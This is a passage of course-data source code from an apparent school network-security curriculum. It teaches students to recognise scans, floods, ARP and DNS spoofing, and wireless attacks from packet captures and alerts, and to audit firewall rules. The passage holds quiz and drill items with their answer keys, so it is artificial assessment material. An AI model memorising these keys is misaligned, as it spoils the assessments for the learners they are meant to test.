     {name:'Port scan',tag:'reconnaissance',tone:'amber',
      rows:[['Sources','One'],['Destination ports','Many'],['Pattern','SYNs to many ports; RST or SYN-ACK back'],['Control','Reduce what answers, and alert']],
      hook:'trying every door handle.'},
     {name:'SYN flood',tag:'denial of service',tone:'bad',
      rows:[['Sources','Many, often forged'],['Destination ports','One'],['Pattern','SYNs without a final ACK; SYN_RECV piles up'],['Control','SYN cookies and rate limits']],
      hook:'a crowd ringing one doorbell.'},
     {name:'Reflection flood',tag:'distributed',tone:'bad',
      rows:[['Sources','Many real servers answering'],['Destination ports','One'],['Pattern','Large DNS or NTP replies nobody here asked for'],['Control','Upstream scrubbing by the provider; ingress filtering (BCP 38) in every network stops forged queries at their source']],
      hook:'a hundred pizzas ordered in your name.'}
   ],{note:'Reflection works because small queries carry your address as a forged source, and open servers answer you with replies many times larger. Blocking one address stops a one-source DoS; a DDoS needs the provider’s help.',
     caption:'One source and many ports is a scan; many sources and one port is a flood; replies nobody requested mean reflection.',bloom:'Analyze'}),
   C('Worked, then faded: DNS in a capture','Analyze',
     TERM('09:40:11.002 IP 10.1.10.37.53311 > 10.1.20.50.53: 4821+ A? bank.example. (30)\n09:40:11.019 IP 10.1.20.50.53 > 10.1.10.37.53311: 4821 1/0/0 A 198.51.100.40 (46)\n09:41:30.410 IP 10.1.10.52.60122 > 10.1.20.50.53: 7310+ A? bank.example. (30)\n09:41:30.411 IP 10.1.20.50.53 > 10.1.10.52.60122: 7310 1/0/0 A 10.1.10.44 (46)\n09:41:30.428 IP 10.1.20.50.53 > 10.1.10.52.60122: 7310 1/0/0 A 198.51.100.40 (46)'),
     TIPS('<b>Lines 1 and 2, worked:</b> the laptop asks the school resolver for bank.example (query ID 4821; + asks for recursion), and 17 ms later the reply repeats the ID with one answer, a public address. Normal.',
          '<b>Lines 3 to 5, your turn:</b> how many answers came back for ID 7310, how fast did each arrive, and where does each send the user? Decide before you read on.',
          '<b>Check:</b> two answers for one query. The 1 ms reply beat the resolver’s usual 17 ms and points the bank at a classroom PC; the client keeps the first. That is a forged reply from an on-path host (with <code>-e</code>, its source MAC is 10.1.10.44’s). DAI and DHCP snooping remove the position, encrypted DNS to the resolver (DNS over TLS or HTTPS: DoT or DoH) makes a forged reply fail, and the certificate warning is the user’s last line. DNSSEC guards the resolver’s cache, not this last hop.')),
   C('Forged sources, replays, and the host’s view','Analyze',
     TIPS('<b>Loopback on the wire is forged.</b> 127.0.0.0/8 never leaves a host, so a packet from 127.0.0.1, or from an inside address such as 10.1.20.5, arriving on the internet interface lied about its source. Ingress filtering drops both.',
          '<b>A replay</b> resends a captured valid message, such as a sign-in, to repeat its effect. A one-time value makes the copy fail: a timestamp (Kerberos refuses one more than 5 minutes off), a nonce (TLS), a sequence number (IPsec), or a token that expires. In a capture, one payload appears twice, minutes apart.',
          '<b>The host sees floods too.</b> Hundreds of SYN-RECV lines in <code>ss -tan</code>, or SYN_RECEIVED in <code>netstat -ano</code>, match the flood in the capture.',
          '<b>ICMP tells a story.</b> Echo replies to a host that sent no requests mean reflection; port-unreachable messages leaving a server answer a UDP scan; time-exceeded replies are a normal trace (<a href="#sophomore/s7">Network tools and a safer router</a>).')),
   SPOT('j7sp','Spot the scan, then triage three alerts','A capture from a tap on RtrA’s internet link, where 203.0.113.2 is RtrA’s outside address; the brief allows only HTTPS from outside. The sensor watches that tap and SwA’s SPAN copy of the RtrA uplink, so its alerts show outside and inside addresses. Context: the school’s vulnerability scanner (10.1.20.60) runs on Tuesdays, today is Tuesday, and the change log lists the nightly backup from 10.1.20.40 to 198.51.100.70. Tap every line the outside scanner sent and every line that needs action, then Check.',[
     ['09:14:01.200 IP 198.51.100.23.51544 > 203.0.113.2.443: Flags [S]',null],
     ['09:14:01.201 IP 203.0.113.2.443 > 198.51.100.23.51544: Flags [S.]',null],
     ['09:14:01.230 IP 198.51.100.23.51544 > 203.0.113.2.443: Flags [.]',null],
     ['09:14:03.512 IP 203.0.113.50.40001 > 203.0.113.2.22: Flags [S], win 1024','One source and one source port, a scanner’s tiny window (nmap’s SYN scan sends win 1024), and ports climbing: a SYN scan has begun.'],
     ['09:14:03.513 IP 203.0.113.2.22 > 203.0.113.50.40001: Flags [R.]',null,'This reset comes from RtrA and shows port 22 closed, which is the brief working. The drill asks for lines the scanner sent, and RtrA sent this one.'],
     ['09:14:03.514 IP 203.0.113.50.40001 > 203.0.113.2.23: Flags [S], win 1024','The next port in the same sweep.'],
     ['09:14:03.515 IP 203.0.113.2.23 > 203.0.113.50.40001: Flags [S.]','Telnet answered SYN-ACK: 23 is open to the internet, against the brief. Close it on RtrA.'],
     ['09:14:03.516 IP 203.0.113.50.40001 > 203.0.113.2.23: Flags [R]','A reset instead of the final ACK: the half-open signature, and proof the scanner found 23.'],
     ['[1:900412:3] Telnet sign-in attempt from outside [Priority: 2] {TCP} 203.0.113.50:40011 -> 203.0.113.2:23','True positive: the scanner returned to the port it found open. Escalate, and close 23.'],
     ['[1:900101:2] Port sweep [Priority: 3] {TCP} 10.1.20.60:41022 -> 10.1.10.37:445',null,'An expected sweep: 10.1.20.60 is the school’s vulnerability scanner, and today is Tuesday, its scheduled day.'],
     ['[1:900233:4] Large outbound transfer [Priority: 2] {TCP} 10.1.20.40:50514 -> 198.51.100.70:22',null,'The change log lists this exact job, the nightly backup from 10.1.20.40 to 198.51.100.70, so it is approved traffic.']
   ]),
   SPOT('j7sp2','Two MACs claim one gateway','<code>tcpdump -n -e arp</code> on a SPAN copy of everything SwA receives in VLAN 10 (<code>no monitor session 1</code> first, since one session takes either ports or VLANs, then <code>monitor session 1 source vlan 10 rx</code> and the fa0/24 destination again). RtrA (10.1.10.1) is 00:1a:2b:3c:4d:01, and KAILUA-WS07 (10.1.10.37) is 3c:a9:f4:12:7b:5e. Tap every forged claim, and the line that names the switch port it came from, then Check.',[
     ['09:20:01.004 3c:a9:f4:12:7b:5e > ff:ff:ff:ff:ff:ff Request who-has 10.1.10.1 tell 10.1.10.37',null],
     ['09:20:01.005 00:1a:2b:3c:4d:01 > 3c:a9:f4:12:7b:5e Reply 10.1.10.1 is-at 00:1a:2b:3c:4d:01',null,'The real answer: RtrA’s own MAC, 00:1a:2b:3c:4d:01, replying to the request the laptop sent a moment before.'],
     ['09:20:02.310 5c:87:9c:11:22:33 > ff:ff:ff:ff:ff:ff Request who-has 10.1.10.44 tell 10.1.10.44',null,'A host announcing its own address (a gratuitous ARP) is routine, and it claims nothing about the gateway.'],
     ['09:20:03.117 5c:87:9c:11:22:33 > 3c:a9:f4:12:7b:5e Reply 10.1.10.1 is-at 5c:87:9c:11:22:33','A reply nobody asked for, from 10.1.10.44’s MAC, claiming the gateway: a laptop that accepts it sends off-subnet traffic to that PC.'],
     ['09:20:03.118 5c:87:9c:11:22:33 > 00:1a:2b:3c:4d:01 Reply 10.1.10.37 is-at 5c:87:9c:11:22:33','The other half, aimed at RtrA: if RtrA accepts it, the laptop’s replies go to the same PC. Both directions together put that PC on-path.'],
     ['09:20:05.120 5c:87:9c:11:22:33 > 3c:a9:f4:12:7b:5e Reply 10.1.10.1 is-at 5c:87:9c:11:22:33','Repeated every 2 seconds to keep the cache poisoned.'],
     ['09:20:06.402 00:1a:2b:3c:4d:01 > ff:ff:ff:ff:ff:ff Request who-has 10.1.10.52 tell 10.1.10.1',null,'RtrA asking for another host is ordinary ARP: it comes from the real gateway MAC and claims nothing.'],
     ['SwA: %SW_DAI-4-DHCP_SNOOPING_DENY: 1 Invalid ARPs (Res) on Fa0/7, vlan 10.([5c87.9c11.2233/10.1.10.1/3ca9.f412.7b5e/10.1.10.37/...])','DAI drops each forged reply, to the laptop and to RtrA alike, and names the port: Fa0/7 is where the PC sits.']
   ]),
   MATCH('j7m','Traffic pattern to attack','Tap a pattern, then the attack that leaves it.',[
     ['One source sends SYNs to 1,000 ports in 4 seconds; RSTs come back','Port scan','One source, many ports.'],
     ['Thousands of sources send SYNs to port 443; no final ACK arrives','SYN flood','Half-open connections fill the queue.'],
     ['Large DNS answers arrive from hundreds of resolvers; nobody here asked','Reflection flood','Forged queries named you as their source.'],
     ['Packets flagged [FPU] or [none] reach the edge','A packet-crafting tool','A normal stack never sets these; drop them at the edge.'],
     ['Two MACs answer for the gateway’s IP address','ARP spoofing','A forged reply claims the gateway.'],
     ['A second DHCP offer, naming another gateway, from an unknown server','Rogue DHCP server','Snooping drops it on access ports.'],
     ['A valid sign-in message appears twice, the copy 6 minutes later from another host','Replay','A timestamp or nonce makes the copy fail.'],
     ['Packets from 127.0.0.1 arrive on the internet interface','Spoofed source address','Loopback stays inside one host.']
   ],'Analyze'),
   QUIZ('j7q','Check: read the wire',[
     ['Packets with <code>Flags [FS]</code> arrive from an outside address. What do you conclude?',['A normal close','A crafted packet: no normal stack sets SYN and FIN together','A slow handshake','A reply to your own scan'],1,'SYN+FIN, null, and Xmas packets probe the firewall: drop them at the edge and note the source.',{whys:['A normal close uses FIN on its own, apart from SYN.','No normal stack sets SYN and FIN together, so a crafting tool made this packet.','A slow handshake still uses SYN, SYN-ACK, and ACK in turn.','Replies to your own scan come back as SYN-ACK or RST.'],imp:'good',c:'net-handshake'}],
     ['Kanoa wants to practice with Wireshark on the school Wi-Fi at lunch. What is the right call?',['Go ahead: it only reads','Capture only his own traffic there','Capture only where he owns the network or holds written permission, such as his own lab','Ask a friend first'],2,'School networks forbid capture; his own lab and these excerpts give the same practice.',{whys:['Reading alone still collects other people’s data, which needs permission.','His own traffic shares the school network, and school rules forbid capturing there.','A capture holds other people’s data, so he captures only where he owns the network or holds written permission.','Permission comes from the network’s owner, the school, rather than a friend.'],imp:'core',c:'eth-cyber-ethics'}],
     ['A priority 1 alert: an SMB exploit signature from 203.0.113.44 to makani-web, a Linux web server with no SMB service and 445 filtered. Best next step?',['Wipe makani-web','Confirm it is not exposed (no listener, no session in the capture), record it, and watch the source','Turn the sensor off','Escalate as a confirmed breach'],1,'An alert is a question; its priority describes the rule, and this event needs its own rating.',{whys:['Wiping on an unconfirmed alert destroys evidence and service over a likely miss.','The exploit needs SMB, so confirming exposure, recording it, and watching the source fits the facts.','Turning the sensor off blinds you to the next, real alert.','Calling it a breach jumps ahead of the evidence, since the server runs without SMB.'],imp:'core',c:'det-triage'}],
     ['KAILUA-WS07’s <code>ipconfig /all</code> shows DHCP Server, Default Gateway, and DNS Servers all reading 10.1.10.44, a classroom PC. What happened, and what stops it?',['A rogue DHCP server answered first; DHCP snooping','A normal second pool; nothing','A broadcast storm; storm control','A DNS outage; flush the cache'],0,'A rogue DHCP offer puts one PC on-path for everything the laptop sends. <a href="#sophomore/s7">Review: Network tools and a safer router</a>',{whys:['One classroom PC as server, gateway, and DNS means a rogue DHCP offer; DHCP snooping drops offers from access ports.','A real second pool would name the school’s own gateway and DNS servers.','A broadcast storm floods the network and leaves address settings alone.','A DNS outage leaves the DHCP server and gateway as they were.'],imp:'core',c:'threat-network-attacks'}],
     ['<code>nslookup bank.example</code> returns 10.1.10.44 from the school resolver; <code>nslookup bank.example 203.0.113.53</code> returns 198.51.100.40. What do you suspect first?',['Normal regional answers','A poisoned cache or a changed DNS setting steering users to an inside host','A slow resolver','IPv6'],1,'Check the resolver’s cache and forwarders and warn users; nslookup skips the hosts file, so DNS answered. <a href="#sophomore/s7">Review: Network tools and a safer router</a>',{whys:['Regional answers would still be public addresses, and 10.1.10.44 is private.','A private answer for a public bank marks a tampered lookup in the school resolver’s cache or settings.','A slow resolver delays the answer and keeps it correct.','IPv6 answers use longer addresses with colons, and both answers here are IPv4.'],imp:'core',c:'threat-network-attacks'}],
     ['The Site A router logs <code>%SEC-6-IPACCESSLOGP: list EDGE-IN denied udp 127.0.0.1(53) -> 203.0.113.2(53), 1 packet</code>. What does the source tell you?',['The router queried itself','Normal DNS','The source was forged, since loopback never crosses a wire, and the edge ACL dropped it','The router’s clock is wrong'],2,'127.0.0.0/8 stays inside one host, so this packet lied about its origin; ingress filtering did its job. <a href="#sophomore/s10">Review: Read the logs: Windows, Linux, and network devices</a>',{whys:['A router’s own queries leave from its interface addresses, and loopback stays inside the router.','Normal DNS comes from real addresses, and 127.0.0.1 never crosses a wire.','Loopback stays inside one host, so a packet claiming it was forged, and the edge ACL dropped it.','The clock affects timestamps, and the clue here is the source address.'],imp:'good',c:'det-firewall-logs'}],
     ['<code>netstat -ano</code> on a web server lists 600 SYN_RECEIVED lines, and flows show 4,000 sources each sending a few SYNs to 443. Why does blocking the top address fail?',['It is a scan, so blocking works','It is a distributed SYN flood: thousands of sources, often forged; turn on SYN cookies and call the provider','The server is misconfigured','ACKs are lost in transit'],1,'SYN cookies reserve nothing for a half-open connection, and the provider filters upstream. <a href="#sophomore/s7">Review: Network tools and a safer router</a>',{whys:['A scan is one source touching many ports; this is thousands of sources at one port.','Thousands of often forged sources at one port is a distributed SYN flood, so SYN cookies and the provider answer it.','The flood comes from outside, so changing the server’s setup alone leaves the traffic coming.','Lost ACKs cause a few stalls, rather than 4,000 sources each sending SYNs.'],imp:'core',c:'threat-network-attacks'}],
     ['Thousands of ICMP echo replies reach 203.0.113.80, which sent no echo requests. What is happening?',['A normal ping','A reflected flood: forged requests named 203.0.113.80 as their source','A trace','The host is offline'],1,'Replies nobody asked for mean someone forged your address in requests to many other hosts.',{whys:['A normal ping gets replies to requests the host sent itself.','Replies to requests it never sent mean someone forged 203.0.113.80 as the source in requests to many hosts.','A trace from this host would show its own outgoing probes.','The host is receiving thousands of packets, so it is online and under load.'],imp:'good',c:'threat-network-attacks'}],
     ['A domain controller refuses a sign-in message stamped 9 minutes ago, and the clocks agree. What did the timestamp stop?',['A replay of a captured message','A port scan','A SYN flood','ARP spoofing'],0,'Kerberos refuses messages more than 5 minutes off, so a copied sign-in expires fast.',{whys:['The timestamp makes a captured sign-in expire fast, which stops a replay.','A port scan sends probes, rather than reusing an old sign-in message.','A SYN flood fills the handshake queue, a separate problem from sign-in timestamps.','ARP spoofing redirects traffic on the local network, a separate problem from sign-in timestamps.'],imp:'good',c:'threat-network-attacks'}],
     ['A sniffer on a Students PC usually hears its own traffic and broadcasts. Today it shows other Students PCs’ traffic, and SwA’s MAC table is full. What happened, and what stops it?',['A trunk formed; nonegotiate','MAC flooding; port security with a maximum MAC count','DNS poisoning; DNSSEC','A broadcast storm; storm control'],1,'A full table makes the switch flood each frame out every port in the VLAN. <a href="#junior/j4">Review: Cisco: VLANs, routing, and ACLs</a>',{whys:['A trunk forming shows tagged VLAN traffic, and the full MAC table is the clue here.','A full MAC table makes the switch flood frames out every port; port security caps the MACs per port.','DNS poisoning changes name answers and leaves the switch’s MAC table alone.','A broadcast storm floods broadcasts, and the full MAC table points to fake source MACs.'],imp:'core',c:'threat-network-attacks'}]
   ]),
   LINKS('Go further',['tcpdump-man','wireshark-guide','cisa'])
   ]},
 {id:'j6',title:'Network security design: firewalls, zones, VPNs, and Wi-Fi',bloom:'Analyze',sum:'Compare firewall types, set the rules between zones with a DMZ, place sensors, admit devices with 802.1X, choose a VPN, and recognize wireless attacks from what they leave behind.',
  can:'compare firewall types, write the rules between zones with a DMZ, place a sensor, admit a device with 802.1X, choose a VPN, and recognize a wireless attack',
  blocks:[
   SCALE('What each firewall can see',{from:'Reads less',to:'Reads more',bands:[
     ['Stateless ACL','Each packet alone: addresses, ports, and flags. Replies need their own rule, such as <code>permit tcp any any established</code>.','l1'],
     ['Stateful firewall','Adds a connection table: a reply that matches an allowed connection passes on its own; an unsolicited packet meets the rules.','l2'],
     ['Next-generation firewall','Adds application ID, user ID, URL categories, IPS, and TLS inspection where policy allows, so it can block one app on 443 and allow the rest.','l4',1.3]]},
     {caption:'Host and network firewalls can each be stateful: the network one guards a whole zone, and the host one also knows which program is talking.',bloom:'Analyze'}),
   QUIZ('j6ck1','Check yourself',[
     ['Kona Hillside Roasters wants to block one file-sharing app that runs over TCP 443 and keep the rest of the web. Which control can?',['A stateless ACL','A stateful firewall','A next-generation firewall with application ID','NAT'],2,'Port 443 carries both; only application ID tells them apart.',{whys:['A stateless ACL reads addresses and ports, and both apps share TCP 443.','A stateful firewall tracks connections, yet both apps look like TCP 443 to it.','Application ID reads past the port to name the app, so it can block one app on 443 and keep the web.','NAT translates addresses and leaves apps unfiltered.'],imp:'core',c:'net-firewall-design'}]
   ]),
   C('Rules for both directions and both families','Analyze',
     TIPS('<b>Egress filtering:</b> most hosts may send anything out, so malware calls home freely. Allow only the outbound services the site needs; deny and log the rest, which also exposes beacons.',
          '<b>Egress allow list:</b> web via the proxy, DNS to approved resolvers, and mail from the mail server. NTP (UDP 123) leaves from the time source, such as the PDC emulator.',
          '<b>Web and DNS filtering:</b> a proxy or filtering resolver blocks known-bad and off-policy sites and logs each request. It shows up as a block page, a proxy setting, or a DNS answer that points at a block server.',
          '<b>IPv6 needs its own rules.</b> Most hosts run IPv6 beside IPv4, often unnoticed, so an IPv4-only rule set leaves the second family open. Allow the ICMPv6 messages that neighbor discovery (types 133 to 136) and Packet Too Big (type 2) need; blocking all ICMPv6 breaks IPv6 itself.',
          '<b>NAT translates; the firewall filters.</b> One port forward opens a path straight in, and IPv6 usually skips NAT entirely (<a href="#freshman/f9">Networks around you: home, school, and the internet</a>).'),
     TERM('C:\\> ipconfig          (KAILUA-WS07; Site A runs IPv4 only)\n   IPv6 Address. . . . . . . . . . . : 2001:db8:66:1:84f2:1c9a:6e0b:3d57\n   Link-local IPv6 Address . . . . . : fe80::9c1e:5f03:2a7d:91b7%12\n   IPv4 Address. . . . . . . . . . . : 10.1.10.37\n   Default Gateway . . . . . . . . . : fe80::5e87:9cff:fe11:2233%12\n                                       10.1.10.1\n\nproxy     19:22:41Z 10.1.10.37 GET http://files.share-drop.example/ 403 category=file-sharing action=BLOCK\nresolver  19:22:43Z 10.1.10.37 A? bad-updates.example -> 10.1.20.250 (block page) policy=malware'),
     TIPS('<b>Read the IPv6 lines:</b> a global address and an IPv6 gateway on an IPv4-only network mean a router advertisement arrived, and the gateway’s link-local address is built from 5c:87:9c:11:22:33, a classroom PC: a rogue RA. RA guard stops it, and the IPv6 rules must exist either way.',
          '<b>Read the filter lines:</b> who asked, which category the filter matched, and what it did. A burst of malware-category blocks from one laptop is a lead worth a ticket.')),
   SCALE('Zones and the rules between them',{x:['To','Net','DMZ','In','Guest'],y:['From','Net','DMZ','In','Guest'],cells:[
     [['Same','zone','muted'],['Allow','443','ok'],['Deny','','bad'],['Deny','','bad']],
     [['Allow','443','amber'],['Same','zone','muted'],['Deny','except 5432','amber'],['Deny','','bad']],
     [['Allow','443, 53, 123','ok'],['Allow','443, 22','ok'],['Same','by VLAN','muted'],['Deny','','bad']],
     [['Allow','80, 443, 53','ok'],['Allow','443','ok'],['Deny','','bad'],['Same','each alone','muted']]]},
     {intro:'Net is the internet, and In is the inside. Read each row as one zone’s outbound policy: deny is the default, each allow names its port, and replies to allowed traffic pass by state. The <b>perimeter</b> faces the internet, the <b>DMZ</b> holds the servers the internet must reach, and <b>internal segmentation</b> splits the inside, so a hacked web server or laptop still faces a firewall before anything that matters.',
      note:'<b>The fine print:</b> DMZ servers reach the internet only through the proxy. Inside hosts use 53 only to the approved resolvers, and 123 only from the time source. Only the jump host reaches DMZ port 22. Guests use the filtering resolver. The one DMZ-to-inside path is the app server to the database on 5432.',
      caption:'A home router’s “DMZ host” setting forwards every port to one inside device: the opposite of a DMZ.',bloom:'Analyze'}),
   C('Place everything else','Analyze',
     TIPS('<b>Guest and IoT:</b> visitors’ phones, cameras, TVs, and the payment terminal each get their own SSID and VLAN with client isolation, internet only.',
          '<b>Management plane:</b> device admin only from a management VLAN or jump host, over SSH, with <code>access-class</code> on every VTY line (<a href="#junior/j4">Cisco: VLANs, routing, and ACLs</a>).',
          '<b>Between sites:</b> Site A and Site B meet over a WAN link; across the internet, a site-to-site VPN carries it.',
          '<b>Shared storage:</b> a NAS shares files with people; a SAN lends disks to servers.',
          '<b>Ransomware can encrypt both:</b> give each its own segment, admin pages off user VLANs, and immutable snapshots that a stolen admin password cannot erase.')),
   DETAIL('NAS and SAN compared',
     COMPARE('NAS and SAN',[
       {name:'NAS',tag:'files',tone:'l2',
        rows:[['Serves','Files and folders over SMB or NFS'],['Who mounts it','People and PCs, as shares or mapped drives'],['Its network','The LAN, ideally its own storage VLAN'],['Ransomware risk','Any infected PC with a mapped drive can encrypt the shares']]},
       {name:'SAN',tag:'raw blocks',tone:'ok',
        rows:[['Serves','Raw disk blocks that a server formats as its own drive'],['Who mounts it','Servers only'],['Its network','A dedicated storage network (iSCSI or Fibre Channel)'],['Ransomware risk','One hacked server encrypts whole volumes, backups included']]}
     ],{bloom:'Analyze'})),
   COMPARE('Where a sensor sits',[
     {name:'SPAN or TAP copy',tag:'IDS',tone:'l2',
      rows:[['Sees','A copy of the links it mirrors'],['If it fails','Traffic keeps flowing; alerts stop'],['Misses','Encrypted payloads, east-west traffic on links it is not placed on, and drops when the copy overloads'],['Best spot','SwA’s copy of the RtrA uplink, inside NAT, so alerts name real hosts; a tap outside RtrA adds attacks on the router itself']]},
     {name:'Inline',tag:'IPS',tone:'amber',
      rows:[['Sees','Every packet on the one link it sits in'],['If it fails','Traffic stops unless set to fail open'],['Misses','Encrypted payloads, and any path around it'],['Best spot','Between the edge firewall and the DMZ, or inside the NGFW']]},
     {name:'Host agent',tag:'HIDS or EDR',tone:'l3',
      rows:[['Sees','One machine: processes, files, and traffic after decryption'],['If it fails','That host goes unwatched'],['Misses','Every device without the agent: printers, cameras, and switches'],['Best spot','Servers first (HILO-FS01), then staff laptops']]}
   ],{intro:'<a href="#freshman/f13">Watch, detect, and respond</a> sorted detect from prevent.',
     caption:'A copy watches without risk to traffic, inline can block yet can also stop the link, and a host agent sees past encryption on one machine.',bloom:'Analyze'}),
   SEQ('Admit a device with 802.1X',[
     ['Plug in or join','The port, or the SSID, passes only sign-in (EAP) traffic until the device proves itself.'],
     ['The switch asks','The switch or access point relays the device’s sign-in to the RADIUS server.'],
     {ask:'Does the client validate the server certificate?',branches:[['Yes: safe','The protected tunnel ends at the real RADIUS server.'],['No: exposed','The sign-in is exposed to a look-alike network that presents any certificate.']]},
     ['RADIUS checks','A password inside the tunnel (PEAP) or the device’s own certificate (EAP-TLS), plus group and health; every decision is logged.'],
     {ask:'Which VLAN does RADIUS assign?',tone:'l2',branches:[['Staff','Known user, healthy device.'],['Guest','Unknown user: internet only.'],['Quarantine','Missing updates or antivirus: fix first.']]}
   ],{intro:'Network access control checks who and what a device is before the port opens.',
     bloom:'Analyze'}),
   C('The certificate check that stops a twin','Analyze',
     P('A certificate, signed by a CA, ties a name to a public key (<a href="#sophomore/s8">Web traffic, HTTPS, and certificates</a>). A browser checks the name, dates, and chain by itself; a Wi-Fi client checks what its profile names. So the profile must name the trusted CA and expected server, and decide whether the user may overrule a mismatch. Pua’s laptop at Hilo Lehua Clinic, two days apart:'),
     TERM('Monday: joined ClinicStaff without a prompt\n  Profile trusts: Hilo Lehua Clinic Internal CA\n  Server name:    radius.lehua-clinic.example\n  Notifications:  Tell user if the server’s identity can’t be verified\n\nTuesday, joining ClinicStaff:\n  Continue connecting?\n  If you expect to find ClinicStaff in this location, go ahead and connect.\n  Otherwise, it may be a different network with the same name.\n  Issued to: radius.lehua-clinic.example\n  Issued by: radius.lehua-clinic.example\n  [Connect]  [Don’t connect]'),
     TIPS('<b>Tuesday is a twin.</b> The name matches, yet the issuer equals the subject: a self-signed certificate that chains to nothing the profile trusts. Choose Don’t connect and report it. The button appears only because Monday’s profile lets the user approve a server it cannot verify.',
          '<b>Remove the choice.</b> Push the Wi-Fi profile by Group Policy or device management with the trusted CA and server name filled in and user prompts turned off (“Don’t ask user to authorize new servers or trusted CAs”), so a mismatch fails without a button.',
          '<b>PEAP or EAP-TLS:</b> PEAP guards a password inside a TLS tunnel that only the server’s certificate secures; EAP-TLS gives each device its own certificate and private key, so a twin collects nothing reusable.',
          '<b>MAC-based admission</b> for printers that cannot sign in admits any device that copies an allowed MAC, so give those devices a tight VLAN. Each switch and access point shares a <b>RADIUS</b> secret: long and unique.')),
   QUIZ('j6ck2','Check yourself',[
     ['Clinic laptops accept any server certificate on ClinicStaff. What does that invite, and what fixes it?',['Nothing: the password is encrypted','An evil twin collecting sign-ins; a pushed profile that trusts only the clinic’s CA, names its RADIUS server, and never asks the user','A deauth flood; PMF','A SYN flood; SYN cookies'],1,'The PEAP tunnel ends wherever the certificate leads; validation proves it is the real server. <a href="#sophomore/s8">Review: Web traffic, HTTPS, and certificates</a>',{whys:['The password travels in a tunnel to whatever server answers, so an evil twin can still collect it.','Without a certificate check a twin can pose as the server; a profile that trusts only the clinic’s CA and names its RADIUS server stops it.','A deauth flood knocks clients off, and PMF answers that; this setting invites a twin.','A SYN flood fills a server’s handshake queue, a separate problem from Wi-Fi sign-in.'],imp:'core',c:'net-nac'}]
   ]),
   C('Choose the tunnel','Analyze',
     COMPARE('Remote-access VPN, site-to-site VPN, and HTTPS',[
       {name:'Remote-access VPN',tag:'device to site',tone:'amber',
        rows:[['Built by','A client app on the laptop, to the site’s VPN gateway'],['Protects','The laptop’s traffic to the site, or all of it without split tunneling'],['Ends at','The gateway: past it, traffic is inside'],['Watch for','Stolen passwords: require MFA, and land users in a limited segment']]},
       {name:'Site-to-site VPN',tag:'network to network',tone:'l2',
        rows:[['Built by','The two edge routers or firewalls, always on'],['Protects','Everything between the two sites; users notice nothing'],['Ends at','Each site’s edge'],['Watch for','Short pre-shared keys and old algorithms: prefer IKEv2 with certificates']]},
       {name:'HTTPS',tag:'app to server',tone:'ok',
        rows:[['Built by','The browser and the server, per connection'],['Protects','One application’s traffic, up to where TLS ends'],['Ends at','The server, or the first device that decrypts it: a load balancer or an inspecting firewall'],['Watch for','Certificate warnings and retired TLS versions']]}
     ],{bloom:'Analyze'}),
     P('<b>Split tunneling</b> sends only company traffic through the tunnel: lighter on the link, yet the laptop’s web traffic then skips the site’s filters and sensors, so policy decides it.'),
     DETAIL('IPsec: IKE, ESP, tunnel mode, and transport mode',
       TIPS('<b>IKE</b> (IKEv2 today) proves each end, with certificates or a pre-shared key, and agrees on keys.',
            '<b>ESP</b> encrypts and authenticates each packet; its sequence numbers make a replayed copy fail.',
            '<b>Tunnel mode</b> wraps the whole original packet in a new outer IP header between two gateways, hiding the inside addresses: the site-to-site choice.',
            '<b>Transport mode</b> keeps the original IP header and protects only the payload, for two hosts talking directly.'))),
   COMPARE('Rogue AP, evil twin, and deauth flood',[
     {name:'Rogue AP',tag:'a back door',tone:'amber',
      rows:[['Connects to','Your wired switch'],['Imitates','Nothing: often a staff member’s own router'],['The tell','An unknown BSSID in a wireless scan; an unknown MAC on a wired port'],['Control','802.1X or port security on wall jacks, plus wireless scans']]},
     {name:'Evil twin',tag:'a look-alike',tone:'bad',
      rows:[['Connects to','Its own internet link'],['Imitates','Your SSID'],['The tell','Same SSID with a different BSSID or weaker security mode; a new certificate prompt'],['Control','Certificate validation and WPA3']]},
     {name:'Deauth flood',tag:'a forced drop',tone:'bad',
      rows:[['Connects to','Nothing: it only sends forged frames'],['Imitates','The access point’s disconnect messages'],['The tell','Bursts of deauth frames, then clients reconnecting, often to a twin'],['Control','Protected Management Frames (802.11w), required by WPA3']]}
   ],{caption:'A rogue AP joins your wire, an evil twin copies your name, and a deauth flood knocks clients off.',bloom:'Analyze'}),
   SPOT('j6sp','Audit a small-office firewall rule list','Kona Hillside Roasters runs a web shop in its DMZ (172.16.50.10) and an office LAN (10.30.0.0/24) on IPv4 and IPv6. Brief: customers use HTTPS; staff upload to the shop and manage the firewall from the office admin PC (10.30.0.5). Rules read top down, first match wins, and a packet that matches no rule passes. Tap every rule that weakens the office, then Check.',[
     ['1  allow  any → any             any        temporary, vendor test','An any-any allow at the top matches everything, so every rule below it is dead. Remove it.'],
     ['2  allow  WAN → web shop        tcp 443',null],
     ['3  allow  WAN → web shop        tcp 21     old upload tool','FTP sends passwords in clear text, and only staff upload. Use SFTP from the office instead.'],
     ['4  allow  WAN → firewall        tcp 8443   admin page','The admin page faces the internet. Allow management from 10.30.0.5 alone.'],
     ['5  allow  web shop → LAN        any','A hacked shop reaches every office port. Allow only the one port it needs to the one host, or nothing.'],
     ['6  allow  LAN → 198.51.100.53   udp 53     approved resolver',null,'Office DNS goes to one approved resolver on one port: a narrow rule the office needs.'],
     ['7  allow  LAN → WAN             tcp 443',null],
     ['8  allow  Guest → any           tcp 80, 443','It sits above rule 9, so guests reach office hosts on 80 and 443. Put the deny first.'],
     ['9  deny   Guest → LAN           any',null,'This deny is right where it stands; the fault is rule 8 above it, which matches guest traffic first.'],
     ['10 allow  10.30.0.5 → firewall  tcp 22',null,'Management from the one admin PC is what the brief asks for, and SSH encrypts it.'],
     ['11 deny   ICMPv6 any → any      “block ping”','Blocking all ICMPv6 breaks neighbor discovery and Packet Too Big, so IPv6 fails. Allow those types and limit echo instead.'],
     ['12 deny   WAN → any             any        IPv4 only','The inbound deny-all covers IPv4 alone, so IPv6 from the internet meets no rule. Add the IPv6 deny.']
   ]),
   MATCH('j6m','Wireless symptom to the likely attack','Tap a symptom, then the attack that most likely causes it.',[
     ['Every laptop at Hāpuʻu Fern Café drops off at 10:14, reconnects, and drops again','Deauth flood','Forged disconnect frames; PMF stops them.'],
     ['A second network named HapuuStaff appears, with an unknown BSSID, offering WPA2 only','Evil twin','A look-alike pulls devices down to a weaker mode.'],
     ['A scan finds “Printer-Setup” broadcast from a box plugged into a back-office wall jack','Rogue access point','An unapproved AP on the wire opens a path around the firewall.'],
     ['The router logs hundreds of failed 8-digit setup-PIN tries overnight','WPS PIN guessing','Turn WPS off.'],
     ['A visitor’s laptop joins the MAC-filtered network using a staff phone’s address','MAC address copying','MACs travel in clear; use WPA3 or 802.1X.'],
